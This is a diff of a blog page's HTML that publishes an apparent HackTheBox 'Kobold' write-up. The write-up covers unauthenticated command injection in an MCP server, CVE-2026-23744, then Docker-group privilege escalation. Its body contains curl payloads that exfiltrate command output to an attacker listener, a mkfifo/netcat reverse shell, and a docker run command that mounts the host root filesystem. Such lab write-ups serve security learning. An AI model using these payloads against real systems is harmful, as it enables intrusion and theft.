@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
@@ -9,16 +9,16 @@
 <meta name="keywords" content="CVE-2026-23744, MCP, RCE, Docker Escape, PrivateBin">
 <meta name="description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/kobold/">
+<link rel="canonical" href="https://adhikariashwin0.com.np/writeups/hackthebox/kobold/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.e0ec520298f6c84b5b6a52f757391346c066b1d17f71c1ea9fa29811db7a0893.css" integrity="sha256-4OxSApj2yEtbalL3VzkTRsBmsdF/ccHqn6KYEdt6CJM=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://adhikariashwin0.com.np/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://adhikariashwin0.com.np/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://adhikariashwin0.com.np/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://adhikariashwin0.com.np/apple-touch-icon.png">
+<link rel="mask-icon" href="https://adhikariashwin0.com.np/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/kobold/">
+<link rel="alternate" hreflang="en" href="https://adhikariashwin0.com.np/writeups/hackthebox/kobold/">
 <noscript>
     <style>
         #theme-toggle,
@@ -70,7 +70,7 @@
         document.querySelector("html").dataset.theme = 'light';
     }
 
-</script><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/kobold/">
+</script><meta property="og:url" content="https://adhikariashwin0.com.np/writeups/hackthebox/kobold/">
   <meta property="og:site_name" content="the008Killer">
   <meta property="og:title" content="HTB-Kobold">
   <meta property="og:description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
@@ -84,9 +84,9 @@
     <meta property="article:tag" content="RCE">
     <meta property="article:tag" content="Docker Escape">
     <meta property="article:tag" content="PrivateBin">
-      <meta property="og:image" content="http://localhost:1313/papermod-cover.png">
+      <meta property="og:image" content="https://adhikariashwin0.com.np/papermod-cover.png">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://localhost:1313/papermod-cover.png">
+<meta name="twitter:image" content="https://adhikariashwin0.com.np/papermod-cover.png">
 <meta name="twitter:title" content="HTB-Kobold">
 <meta name="twitter:description" content="Kobold is a Linux machine centred around a recently disclosed vulnerability (CVE-2026-23744) in MCPJam, an open-source Model Context Protocol server. Initial access is gained through unauthenticated remote code execution via the MCP connect endpoint. Privilege escalation abuses Docker group membership to mount the host filesystem and read the root flag.">
 
@@ -100,19 +100,19 @@
       "@type": "ListItem",
       "position":  1 ,
       "name": "Writeups",
-      "item": "http://localhost:1313/writeups/"
+      "item": "https://adhikariashwin0.com.np/writeups/"
     }, 
     {
       "@type": "ListItem",
       "position":  2 ,
       "name": "HackTheBox",
-      "item": "http://localhost:1313/writeups/hackthebox/"
+      "item": "https://adhikariashwin0.com.np/writeups/hackthebox/"
     }, 
     {
       "@type": "ListItem",
       "position":  3 ,
       "name": "HTB-Kobold",
-      "item": "http://localhost:1313/writeups/hackthebox/kobold/"
+      "item": "https://adhikariashwin0.com.np/writeups/hackthebox/kobold/"
     }
   ]
 }
@@ -130,18 +130,18 @@
   "articleBody": "Overview Category\rInfo\rMachine NameKobold\rDifficultyEasy\rRelease Date21 March, 2026\rAuthorsau123\rOSLinux\rPwned Date25 March, 2026\rReconnaissance Port Scan 22/tcp — OpenSSH 9.6p1 80/tcp — nginx (redirects to HTTPS) 443/tcp — nginx + TLS (kobold.htb) 3552/tcp — Golang HTTP server (public) Subdomain Enumeration Virtual host enumeration reveals two subdomains:\nSubdomain Service mcp.kobold.htb MCPJam (MCP server) bin.kobold.htb PrivateBin (reverse proxied to Docker container on 127.0.0.1:8080) What is MCPJam? MCPJam is an open-source Model Context Protocol (MCP) server. MCP is a protocol that allows AI assistants to connect to external tools and data sources. MCPJam acts as a bridge — it accepts a configuration from a client and spawns a local process that speaks the MCP JSON-RPC protocol over stdio.\nThe /api/mcp/connect endpoint accepts:\n{ \"serverConfig\": { \"command\": \"...\", \"args\": [...], \"env\": {} }, \"serverId\": \"...\" } It then spawns command with args as a subprocess. CVE-2026-23744 is an unauthenticated server-side command injection — there is no authentication or input validation on this endpoint, allowing any caller to execute arbitrary OS commands on the server.\nWhat is PrivateBin? PrivateBin is a minimalist, open-source pastebin where the server has zero knowledge of stored data. Pastes are encrypted and decrypted entirely in the browser using 256-bit AES, with the decryption key stored only in the URL fragment (#key). This means that even with full filesystem access to the server, paste content cannot be decrypted without the original URL.\nIn this box, PrivateBin runs inside a Docker container (privatebin/nginx-fpm-alpine:2.0.2) with its data directory bind-mounted from the host at /privatebin-data.\nInitial Access — CVE-2026-23744 (RCE via MCPJam) Confirming Blind RCE The /api/mcp/connect endpoint spawns the supplied command directly. However, the server consumes the subprocess’s stdout for MCP JSON-RPC communication, making this blind RCE — output is not returned in the HTTP response. CVE-2026-23744\nTo confirm execution, exfiltrate output out-of-band via an HTTP callback:\ncurl -k https://mcp.kobold.htb/api/mcp/connect \\ --header \"Content-Type: application/json\" \\ --data '{\"serverConfig\":{\"command\":\"sh\",\"args\":[\"-c\",\"id | curl -s http://:4444/$(id | base64 -w0)\"],\"env\":{}},\"serverId\":\"mytest\"}' Listener receives:\nGET /dWlkPTEwMDEoYmVuKSBnaWQ9MTAwMShiZW4pIGdyb3Vwcz0xMDAxKGJlbiksMzcob3BlcmF0b3IpCg== Decoding: uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)\nReverse Shell Direct bash -i \u003e\u0026 /dev/tcp/... redirection fails inside sh. The reliable approach is a named pipe:\ncurl -k https://mcp.kobold.htb/api/mcp/connect \\ --header \"Content-Type: application/json\" \\ --data '{\"serverConfig\":{\"command\":\"sh\",\"args\":[\"-c\",\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc 4444 \u003e/tmp/f\"],\"env\":{}},\"serverId\":\"mytest\"}' Shell received as ben. User flag retrieved from /home/ben/user.txt.\nEnumeration as ben Groups uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator) The operator group is non-standard and worth investigating.\nInternal Services 127.0.0.1:8080 — PrivateBin (Docker container) 127.0.0.1:6274 — Node.js (MCPJam backend) :::3552 — Golang HTTP app (public) Network Interfaces A Docker bridge (docker0: 172.17.0.1) is active with a veth pair, confirming a running container reachable at 172.17.0.2.\nPrivateBin Data Directory /privatebin-data is accessible to the operator group:\ndrwxrwx--- operator /privatebin-data/certs/ ← TLS cert + private key for *.kobold.htb drwxr-x--- gid=82 /privatebin-data/cfg/ ← Config (www-data only) drwxrwxrwx operator /privatebin-data/data/ ← Paste storage (empty) The TLS certificate and private key for *.kobold.htb are readable. However, there are no stored pastes to decrypt — and even if there were, PrivateBin’s zero-knowledge design means the ciphertext is useless without the URL fragment key.\nThe config file (readable via docker exec) contained commented-out example credentials (Z3r0P4ss) but these did not lead anywhere productive.\nDocker Access via Operator Group newgrp docker docker ps CONTAINER ID IMAGE PORTS 4c49dd7bb727 privatebin/nginx-fpm-alpine:2.0.2 127.0.0.1:8080-\u003e8080/tcp The operator group has access to the Docker socket — a classic privilege escalation path equivalent to passwordless sudo.\nPrivilege Escalation — Docker Host Filesystem Mount With Docker socket access, the host filesystem can be mounted inside a new container. The default entrypoint of the PrivateBin image drops privileges to nobody (uid=65534), so it must be overridden:\ndocker run -it --rm \\ -v /:/mnt \\ --entrypoint sh \\ --user root \\ privatebin/nginx-fpm-alpine:2.0.2 Inside the container:\n/var/www # id uid=0(root) gid=0(root) groups=0(root),... The entire host filesystem is now accessible under /mnt:\ncat /mnt/root/root.txt Root flag retrieved.\nWhy --entrypoint sh Was Necessary The default entrypoint (/etc/init.d/rc.local) starts PHP-FPM and nginx, then drops to nobody. Without overriding it, the container still runs as an unprivileged user even though the image is available. The --user root flag alone is insufficient if the entrypoint later switches users — overriding the entrypoint entirely bypasses this.\nAttack Chain Summary Subdomain enum → mcp.kobold.htb (MCPJam) ↓ CVE-2026-23744 — Unauthenticated RCE via /api/mcp/connect ↓ Blind RCE as ben → out-of-band exfil → mkfifo reverse shell ↓ User flag (/home/ben/user.txt) ↓ ben is in operator group → Docker socket access (newgrp docker) ↓ docker run --user root -v /:/mnt → host filesystem as root ↓ Root flag (/root/root.txt) Key Takeaways MCP servers expose powerful process-spawning APIs — any internet-facing MCP endpoint must enforce strong authentication and command whitelisting. The MCP protocol was designed for local trusted use, not public exposure. Blind RCE requires out-of-band exfiltration — stdout is consumed by the MCP protocol layer; HTTP callbacks are the reliable exfil path. Docker group = root — membership in the Docker group is functionally equivalent to passwordless sudo on the host. PrivateBin’s zero-knowledge design held — even with full filesystem and container access, encrypted pastes could not be read without the URL fragment decryption key. ",
   "wordCount" : "841",
   "inLanguage": "en",
-  "image": "http://localhost:1313/papermod-cover.png","datePublished": "2026-08-02T00:00:00Z",
+  "image": "https://adhikariashwin0.com.np/papermod-cover.png","datePublished": "2026-08-02T00:00:00Z",
   "dateModified": "2026-08-02T00:00:00Z",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://localhost:1313/writeups/hackthebox/kobold/"
+    "@id": "https://adhikariashwin0.com.np/writeups/hackthebox/kobold/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "the008Killer",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://localhost:1313/favicon.ico"
+      "url": "https://adhikariashwin0.com.np/favicon.ico"
     }
   }
 }
@@ -163,7 +163,7 @@
 <header class="header sticky-header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="the008Killer (Alt + H)">the008Killer</a>
+            <a href="https://adhikariashwin0.com.np/" accesskey="h" title="the008Killer (Alt + H)">the008Killer</a>
             <span class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
@@ -191,32 +191,32 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/about" title="About">
+                <a href="https://adhikariashwin0.com.np/about" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/writeups" title="Writeups">
+                <a href="https://adhikariashwin0.com.np/writeups" title="Writeups">
                     <span>Writeups</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects" title="Projects">
+                <a href="https://adhikariashwin0.com.np/projects" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/experience" title="Experience">
+                <a href="https://adhikariashwin0.com.np/experience" title="Experience">
                     <span>Experience</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://adhikariashwin0.com.np/search" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags" title="Tags">
+                <a href="https://adhikariashwin0.com.np/tags" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
@@ -227,7 +227,7 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <div class="breadcrumbs"><a href="https://adhikariashwin0.com.np/">Home</a>&nbsp;»&nbsp;<a href="https://adhikariashwin0.com.np/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="https://adhikariashwin0.com.np/writeups/hackthebox/">HackTheBox</a></div>
     <h1 class="post-title entry-hint-parent">
       HTB-Kobold
     </h1>
@@ -438,19 +438,19 @@
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/cve-2026-23744/">CVE-2026-23744</a></li>
-      <li><a href="http://localhost:1313/tags/mcp/">MCP</a></li>
-      <li><a href="http://localhost:1313/tags/rce/">RCE</a></li>
-      <li><a href="http://localhost:1313/tags/docker-escape/">Docker Escape</a></li>
-      <li><a href="http://localhost:1313/tags/privatebin/">PrivateBin</a></li>
+      <li><a href="https://adhikariashwin0.com.np/tags/cve-2026-23744/">CVE-2026-23744</a></li>
+      <li><a href="https://adhikariashwin0.com.np/tags/mcp/">MCP</a></li>
+      <li><a href="https://adhikariashwin0.com.np/tags/rce/">RCE</a></li>
+      <li><a href="https://adhikariashwin0.com.np/tags/docker-escape/">Docker Escape</a></li>
+      <li><a href="https://adhikariashwin0.com.np/tags/privatebin/">PrivateBin</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/writeups/hackthebox/conversor/">
+  <a class="prev" href="https://adhikariashwin0.com.np/writeups/hackthebox/conversor/">
     <span class="title">« Prev</span>
     <br>
     <span>HTB-Conversor</span>
   </a>
-  <a class="next" href="http://localhost:1313/writeups/hackthebox/interpreter/">
+  <a class="next" href="https://adhikariashwin0.com.np/writeups/hackthebox/interpreter/">
     <span class="title">Next »</span>
     <br>
     <span>HTB-Interpreter</span>
@@ -462,7 +462,7 @@
     </main>
     
 <footer class="footer">
-    <span>&copy; 2026 <a href="http://localhost:1313/">the008Killer</a></span>
+    <span>&copy; 2026 <a href="https://adhikariashwin0.com.np/">the008Killer</a></span>
 </footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
